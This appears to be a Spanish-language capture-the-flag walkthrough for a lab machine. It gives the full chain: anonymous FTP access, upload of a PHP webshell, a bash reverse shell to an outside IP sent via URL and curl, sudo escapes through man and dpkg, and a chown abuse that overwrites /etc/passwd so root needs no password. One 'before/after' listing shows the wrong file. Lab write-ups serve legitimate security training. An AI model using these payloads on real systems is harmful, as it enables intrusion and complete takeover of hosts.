PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

-Nos autenticamos por ftp con el usuario anonymous

-Nos vamos al directorio Upload y subimos una webshell:
	-Creamos la webshell:
		-echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>"; ?>' > webshell.php
	-La subimos al directorio Upload
		-put webshell.php

-Nos vamos a la siguiente ruta y nos mandamos una reverse shell:
	-Desde la web: -http://anonymouspingu/upload/webshell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.1.135/1234 0>%261'
	-Con Curl: curl -s -X GET "http://172.17.0.2/upload/webshell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.135/1234+0>%261'" 
	(Sustituimos los espacios por '+' y los '&' por '%26'). (También funciona si lo Url Encodeas todo)

www-data@7ab25f506ced:


## Escalada de Privilegios

-sudo -l:
	(pingu) NOPASSWD: /usr/bin/man

-Lo buscamos en Gtfobins y pivotamos al usuarios pingu:
	-sudo -u pingu /usr/bin/man man
	-!/bin/sh
	pingu@7ab25f506ced:/$

-sudo -l:
	(gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg

-Explotamos cualquiera de ellos para pivotar al usuario gladys:
	-sudo -u gladys /usr/bin/dpkg -l
	-!/bin/sh
	gladys@7ab25f506ced:/$ 

-Comandos que puede ejecutar 'gladys' con sudoers:
	gladys@2d0b563c00ef:/$ sudo -l
		(root) NOPASSWD: /usr/bin/chown

-Podemos usar '/usr/bin/chown' para cambiar los permisos de cualquier archivo. El fichero /etc/passwd pertenece a root por defecto, abusando de 'chown' vamos a hacer que le pertenezca al usuario 'gladys' y así poder modificarlo.

LFILE=/etc/passwd
sudo chown $(id -un):$(id -gn) $LFILE

-Antes de abusar de chown: 
	-rwxr-xr-x 1 root root 59912 Apr  5  2024 /usr/bin/chown
-Después de abusar de chown:
	-rw-r-r 1 gladys gladys 59912 Apr  5  2024 /usr/bin/chown

-Vamos  a modificar el fichero /etc/passwd quitándole la 'x' al usuario root para poder autenticarnos sin aportar contraseña. No están instalados ninguno de los editores de texto, pero 'echo' si. Sobreescribimos el /etc/passwd con esta única línea:
	-echo "root::0:0:root:/root:/bin/bash" > /etc/passwd

gladys@2d0b563c00ef:/$ su root
root@2d0b563c00ef:/# whoami
root
